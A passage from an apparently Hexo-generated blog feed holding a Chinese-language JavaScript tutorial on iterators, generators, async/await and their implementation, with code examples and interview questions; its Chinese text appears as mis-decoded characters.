class="hljs-built_in">setTimeout</span>(handleRejected, <span class="hljs-number">0</span>);<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">onFulfilledCallbacks</span>.<span class="hljs-title function_">push</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">setTimeout</span>(handleFulfilled, <span class="hljs-number">0</span>));<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">onRejectedCallbacks</span>.<span class="hljs-title function_">push</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">setTimeout</span>(handleRejected, <span class="hljs-number">0</span>));<br>      &#125;<br>    &#125;);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Iterator-å’Œ-Generatorï¼šå¯è¿­ä»£åè®®ä¸ç”Ÿæˆå™¨"><a href="#Iterator-å’Œ-Generatorï¼šå¯è¿­ä»£åè®®ä¸ç”Ÿæˆå™¨" class="headerlink" title="Iterator å’Œ Generatorï¼šå¯è¿­ä»£åè®®ä¸ç”Ÿæˆå™¨"></a>Iterator å’Œ Generatorï¼šå¯è¿­ä»£åè®®ä¸ç”Ÿæˆå™¨</h2><p><strong>Iteratorï¼ˆè¿­ä»£å™¨ï¼‰</strong></p><ul><li>è¿­ä»£å™¨åè®®ï¼šä»»ä½•å®ç°äº† next() æ–¹æ³•çš„å¯¹è±¡<ul><li>next() è¿”å› { value, done } å¯¹è±¡</li></ul></li><li>å¯è¿­ä»£åè®®ï¼šå®ç°äº† <a href="">Symbol.iterator</a> æ–¹æ³•çš„å¯¹è±¡</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// è‡ªå®šä¹‰è¿­ä»£å™¨</span><br><span class="hljs-keyword">const</span> counter = &#123;<br>  [<span class="hljs-title class_">Symbol</span>.<span class="hljs-property">iterator</span>]() &#123;<br>    <span class="hljs-keyword">let</span> count = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> &#123;<br>      <span class="hljs-title function_">next</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> count &lt;= <span class="hljs-number">5</span> <br>          ? &#123; <span class="hljs-attr">value</span>: count++, <span class="hljs-attr">done</span>: <span class="hljs-literal">false</span> &#125; <br>          : &#123; <span class="hljs-attr">done</span>: <span class="hljs-literal">true</span> &#125;;<br>      &#125;<br>    &#125;;<br>  &#125;<br>&#125;;<br><br><span class="hljs-comment">// ä½¿ç”¨è¿­ä»£å™¨</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> num <span class="hljs-keyword">of</span> counter) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(num); <span class="hljs-comment">// 1, 2, 3, 4, 5</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Generatorï¼ˆç”Ÿæˆå™¨ï¼‰</strong></p><ul><li>å‡½æ•°ç”Ÿæˆå™¨ï¼šä½¿ç”¨ function* å®šä¹‰çš„ç”Ÿæˆå™¨å‡½æ•°</li><li>æ‰§è¡Œæ§åˆ¶ï¼šé€šè¿‡ yield æš‚åœæ‰§è¡Œï¼Œé€šè¿‡ next() æ¢å¤æ‰§è¡Œ</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span>* <span class="hljs-title function_">idGenerator</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">let</span> id = <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;<br>    <span class="hljs-keyword">const</span> reset = <span class="hljs-keyword">yield</span> id++;<br>    <span class="hljs-keyword">if</span> (reset) id = <span class="hljs-number">1</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> gen = <span class="hljs-title function_">idGenerator</span>();<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(gen.<span class="hljs-title function_">next</span>().<span class="hljs-property">value</span>); <span class="hljs-comment">// 1</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(gen.<span class="hljs-title function_">next</span>().<span class="hljs-property">value</span>); <span class="hljs-comment">// 2</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(gen.<span class="hljs-title function_">next</span>(<span class="hljs-literal">true</span>).<span class="hljs-property">value</span>); <span class="hljs-comment">// 1ï¼ˆé‡ç½®ï¼‰</span><br></code></pre></td></tr></table></figure><p><strong>é«˜çº§ç”Ÿæˆå™¨ç‰¹æ€§</strong></p><p>(1) åŒå‘é€šä¿¡</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span>* <span class="hljs-title function_">twoWayGenerator</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> name = <span class="hljs-keyword">yield</span> <span class="hljs-string">&#x27;What is your name?&#x27;</span>;<br>  <span class="hljs-keyword">yield</span> <span class="hljs-string">`Hello, <span class="hljs-subst">$&#123;name&#125;</span>!`</span>;<br>&#125;<br><br><span class="hljs-keyword">const</span> gen = <span class="hljs-title function_">twoWayGenerator</span>();<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(gen.<span class="hljs-title function_">next</span>().<span class="hljs-property">value</span>); <span class="hljs-comment">// &quot;What is your name?&quot;</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(gen.<span class="hljs-title function_">next</span>(<span class="hljs-string">&#x27;Alice&#x27;</span>).<span class="hljs-property">value</span>); <span class="hljs-comment">// &quot;Hello, Alice!&quot;</span><br></code></pre></td></tr></table></figure><p>(2) é”™è¯¯å¤„ç†</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span>* <span class="hljs-title function_">errorGenerator</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-keyword">yield</span> <span class="hljs-string">&#x27;Start&#x27;</span>;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;Something wrong&#x27;</span>);<br>  &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>    <span class="hljs-keyword">yield</span> <span class="hljs-string">`Caught: <span class="hljs-subst">$&#123;e.message&#125;</span>`</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> gen = <span class="hljs-title function_">errorGenerator</span>();<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(gen.<span class="hljs-title function_">next</span>().<span class="hljs-property">value</span>); <span class="hljs-comment">// &quot;Start&quot;</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(gen.<span class="hljs-title function_">next</span>().<span class="hljs-property">value</span>); <span class="hljs-comment">// &quot;Caught: Something wrong&quot;</span><br></code></pre></td></tr></table></figure><h2 id="Async-Awaitï¼šå¼‚æ­¥ç¼–ç¨‹çš„ç»ˆæè§£å†³æ–¹æ¡ˆ"><a href="#Async-Awaitï¼šå¼‚æ­¥ç¼–ç¨‹çš„ç»ˆæè§£å†³æ–¹æ¡ˆ" class="headerlink" title="Async&#x2F;Awaitï¼šå¼‚æ­¥ç¼–ç¨‹çš„ç»ˆæè§£å†³æ–¹æ¡ˆ"></a>Async&#x2F;Awaitï¼šå¼‚æ­¥ç¼–ç¨‹çš„ç»ˆæè§£å†³æ–¹æ¡ˆ</h2><p><strong>æœ¬è´¨ä¸åŸç†</strong></p><ul><li>è¯­æ³•ç³–ï¼šasync&#x2F;await æ˜¯ Generator + Promise çš„è¯­æ³•ç³–</li><li>æ‰§è¡Œè¿‡ç¨‹ï¼š<ul><li>async å‡½æ•°è¿”å›ä¸€ä¸ª Promise</li><li>await ç­‰å¾… Promise è§£æï¼ˆæš‚åœæ‰§è¡Œä½†ä¸é˜»å¡ä¸»çº¿ç¨‹ï¼‰</li><li>é€šè¿‡éšå¼çš„ç”Ÿæˆå™¨æ§åˆ¶æ‰§è¡Œæµç¨‹</li></ul></li></ul><p><strong>åŸºæœ¬ç”¨æ³•</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchUserData</span>(<span class="hljs-params">userId</span>) &#123;<br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`/api/users/<span class="hljs-subst">$&#123;userId&#125;</span>`</span>);<br>    <span class="hljs-keyword">if</span> (!response.<span class="hljs-property">ok</span>) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;ç”¨æˆ·æ•°æ®è·å–å¤±è´¥&#x27;</span>);<br>    <br>    <span class="hljs-keyword">const</span> userData = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();<br>    <span class="hljs-keyword">const</span> posts = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`/api/posts?userId=<span class="hljs-subst">$&#123;userId&#125;</span>`</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">r</span> =&gt;</span> r.<span class="hljs-title function_">json</span>());<br>    <br>    <span class="hljs-keyword">return</span> &#123; ...userData, posts &#125;;<br>  &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;æ•°æ®åŠ è½½å¤±è´¥:&#x27;</span>, error);<br>    <span class="hljs-keyword">throw</span> error;<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span class="hljs-title function_">fetchUserData</span>(<span class="hljs-number">123</span>)<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data))<br>  .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(error));<br></code></pre></td></tr></table></figure><p><strong>å®ç°åŸç†ï¼ˆåŸºäº Generatorï¼‰</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">asyncGenerator</span>(<span class="hljs-params">generatorFunc</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params">...args</span>) &#123;<br>    <span class="hljs-keyword">const</span> gen = generatorFunc.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>, args);<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> &#123;<br>      <span class="hljs-keyword">function</span> <span class="hljs-title function_">step</span>(<span class="hljs-params">key, arg</span>) &#123;<br>        <span class="hljs-keyword">let</span> result;<br>        <span class="hljs-keyword">try</span> &#123;<br>          result = gen[key](arg);<br>        &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>          <span class="hljs-keyword">return</span> <span class="hljs-title function_">reject</span>(error);<br>        &#125;<br>        <br>        <span class="hljs-keyword">const</span> &#123; value, done &#125; = result;<br>        <span class="hljs-keyword">if</span> (done) &#123;<br>          <span class="hljs-keyword">return</span> <span class="hljs-title function_">resolve</span>(value);<br>        &#125;<br>        <br>        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(value).<span class="hljs-title function_">then</span>(<br>          <span class="hljs-function"><span class="hljs-params">val</span> =&gt;</span> <span class="hljs-title function_">step</span>(<span class="hljs-string">&#x27;next&#x27;</span>, val),<br>          <span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> <span class="hljs-title function_">step</span>(<span class="hljs-string">&#x27;throw&#x27;</span>, err)<br>        );<br>      &#125;<br>      <br>      <span class="hljs-title function_">step</span>(<span class="hljs-string">&#x27;next&#x27;</span>);<br>    &#125;);<br>  &#125;;<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span class="hljs-keyword">const</span> myAsync = <span class="hljs-title function_">asyncGenerator</span>(<span class="hljs-keyword">function</span>* () &#123;<br>  <span class="hljs-keyword">const</span> a = <span class="hljs-keyword">yield</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(<span class="hljs-number">1</span>);<br>  <span class="hljs-keyword">const</span> b = <span class="hljs-keyword">yield</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(<span class="hljs-number">2</span>);<br>  <span class="hljs-keyword">return</span> a + b;<br>&#125;);<br><br><span class="hljs-title function_">myAsync</span>().<span class="hljs-title function_">then</span>(<span class="hljs-variable language_">console</span>.<span class="hljs-property">log</span>); <span class="hljs-comment">// 3</span><br></code></pre></td></tr></table></figure><p><strong>æœ€ä½³å®è·µ</strong></p><p>(1) å¹¶è¡Œä¼˜åŒ–</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// é¡ºåºæ‰§è¡Œï¼ˆæ…¢ï¼‰</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">sequentialFetch</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> user = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/user&#x27;</span>);<br>  <span class="hljs-keyword">const</span> posts = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/posts&#x27;</span>);<br>  <span class="hljs-keyword">return</span> &#123; user, posts &#125;;<br>&#125;<br><br><span class="hljs-comment">// å¹¶è¡Œæ‰§è¡Œï¼ˆå¿«ï¼‰</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">parallelFetch</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [user, posts] = <span class="hljs-keyword">await</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>([<br>    <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/user&#x27;</span>),<br>    <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/posts&#x27;</span>)<br>  ]);<br>  <span class="hljs-keyword">return</span> &#123; user, posts &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><p>(2) å¾ªç¯ä¸­çš„ await</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// é”™è¯¯æ–¹å¼ï¼ˆé¡ºåºæ‰§è¡Œï¼‰</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">processArray</span>(<span class="hljs-params">array</span>) &#123;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> item <span class="hljs-keyword">of</span> array) &#123;<br>    <span class="hljs-keyword">await</span> <span class="hljs-title function_">processItem</span>(item); <span class="hljs-comment">// æ¯æ¬¡å¾ªç¯éƒ½ç­‰å¾…</span><br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// æ­£ç¡®æ–¹å¼ï¼ˆå¹¶è¡Œå¤„ç†ï¼‰</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">processArrayFast</span>(<span class="hljs-params">array</span>) &#123;<br>  <span class="hljs-keyword">await</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>(array.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> <span class="hljs-title function_">processItem</span>(item)));<br>&#125;<br></code></pre></td></tr></table></figure><p>(3) é”™è¯¯å¤„ç†æ¨¡å¼</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æ–¹å¼1ï¼štry/catch</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">tryCatchExample</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> <span class="hljs-title function_">asyncOperation</span>();<br>    <span class="hljs-keyword">return</span> result;<br>  &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>    <span class="hljs-title function_">handleError</span>(error);<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// æ–¹å¼2ï¼šPromise.catch</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">catchExample</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> <span class="hljs-title function_">asyncOperation</span>().<span class="hljs-keyword">catch</span>(handleError);<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br><br><span class="hljs-comment">// æ–¹å¼3ï¼šé«˜é˜¶å‡½æ•°å°è£…</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">asyncHandler</span>(<span class="hljs-params">promise</span>) &#123;<br>  <span class="hljs-keyword">return</span> promise.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> [<span class="hljs-literal">null</span>, data]).<span class="hljs-keyword">catch</span>(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> [err]);<br>&#125;<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">handlerExample</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [error, data] = <span class="hljs-keyword">await</span> <span class="hljs-title function_">asyncHandler</span>(<span class="hljs-title function_">asyncOperation</span>());<br>  <span class="hljs-keyword">if</span> (error) <span class="hljs-title function_">handleError</span>(error);<br>  <span class="hljs-keyword">return</span> data;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="é¢è¯•å¸¸è§é—®é¢˜-7"><a href="#é¢è¯•å¸¸è§é—®é¢˜-7" class="headerlink" title="é¢è¯•å¸¸è§é—®é¢˜"></a>é¢è¯•å¸¸è§é—®é¢˜</h2><p><strong>Qï¼šPromise å’Œ Async&#x2F;Await çš„ä¸»è¦åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ</strong></p><ul><li>Promise æ˜¯å¯¹è±¡ï¼Œasync&#x2F;await æ˜¯è¯­æ³•</li><li>async&#x2F;await ä½¿å¼‚æ­¥ä»£ç çœ‹èµ·æ¥åƒåŒæ­¥ä»£ç </li><li>async&#x2F;await çš„é”™è¯¯å¤„ç†ä½¿ç”¨ try&#x2F;catch æ›´ç›´è§‚</li><li>async&#x2F;await æ›´å®¹æ˜“å®ç°å¤æ‚çš„æ§åˆ¶æµ</li></ul><p><strong>Qï¼šGenerator å‡½æ•°åœ¨å¼‚æ­¥ç¼–ç¨‹ä¸­çš„è§’è‰²æ˜¯ä»€ä¹ˆï¼Ÿ</strong></p><ul><li>æä¾›æš‚åœå’Œæ¢å¤æ‰§è¡Œçš„èƒ½åŠ›</li><li>æ˜¯ async&#x2F;await çš„å®ç°åŸºç¡€</li><li>é€‚åˆå®ç°è‡ªå®šä¹‰è¿­ä»£é€»è¾‘</li><li>å¯ç”¨äºå®ç°åç¨‹ï¼ˆcoroutineï¼‰å’ŒçŠ¶æ€æœº</li></ul><p><strong>Qï¼šå¦‚ä½•å¤„ç†å¤šä¸ªå¼‚æ­¥æ“ä½œçš„é”™è¯¯ï¼Ÿ</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">handleMultiple</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-keyword">const</span> [a, b] = <span class="hljs-keyword">await</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>([<br>      <span class="hljs-title function_">taskA</span>().<span class="hljs-keyword">catch</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> (&#123; <span class="hljs-attr">error</span>: e &#125;)),<br>      <span class="hljs-title function_">taskB</span>().<span class="hljs-keyword">catch</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> (&#123; <span class="hljs-attr">error</span>: e &#125;))<br>    ]);<br>    <br>    <span class="hljs-keyword">if</span> (a.<span class="hljs-property">error</span>) <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;Aå¤±è´¥:&#x27;</span>, a.<span class="hljs-property">error</span>);<br>    <span class="hljs-keyword">if</span> (b.<span class="hljs-property">error</span>) <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;Bå¤±è´¥:&#x27;</span>, b.<span class="hljs-property">error</span>);<br>    <br>    <span class="hljs-keyword">if</span> (!a.<span class="hljs-property">error</span> &amp;&amp; !b.<span class="hljs-property">error</span>) &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;å…¨éƒ¨æˆåŠŸ:&#x27;</span>, a, b);<br>    &#125;<br>  &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;å…¨å±€é”™è¯¯:&#x27;</span>, error);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Qï¼šå¦‚ä½•å–æ¶ˆä¸€ä¸ªæ­£åœ¨è¿›è¡Œçš„å¼‚æ­¥æ“ä½œ</strong></p><p>åœ¨å¼‚æ­¥æ“ä½œç»“æœå“åº”ä¹‹å‰ä¸»åŠ¨ reject æ‰ï¼ˆsetTimeoutï¼‰</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">cancellableAsync</span>(<span class="hljs-params">task</span>) &#123;<br>  <span class="hljs-keyword">let</span> cancel;<br>  <span class="hljs-keyword">const</span> promise = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> &#123;<br>    cancel = <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;æ“ä½œå–æ¶ˆ&#x27;</span>));<br>    <span class="hljs-title function_">task</span>(resolve, reject);<br>  &#125;);<br>  <span class="hljs-keyword">return</span> &#123; promise, cancel &#125;;<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span class="hljs-keyword">const</span> &#123; promise, cancel &#125; = <span class="hljs-title function_">cancellableAsync</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> &#123;<br>  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">resolve</span>(<span class="hljs-string">&#x27;å®Œæˆ&#x27;</span>), <span class="hljs-number">3000</span>);<br>&#125;);<br><br>promise<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-variable language_">console</span>.<span class="hljs-property">log</span>)<br>  .<span class="hljs-keyword">catch</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(e.<span class="hljs-property">message</span>)); <span class="hljs-comment">// &quot;æ“ä½œå–æ¶ˆ&quot;</span><br><br><span class="hljs-comment">// 2ç§’åå–æ¶ˆ</span><br><span class="hljs-built_in">setTimeout</span>(cancel, <span class="hljs-number">2000</span>);<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JavaScript</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaScript</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>React Fiber ä¸“é¢˜çŸ¥è¯†å­¦ä¹ </title>
    <link href="/2025/06/05/React%20Fiber/"/>
    <url>/2025/06/05/React%20Fiber/</url>
    
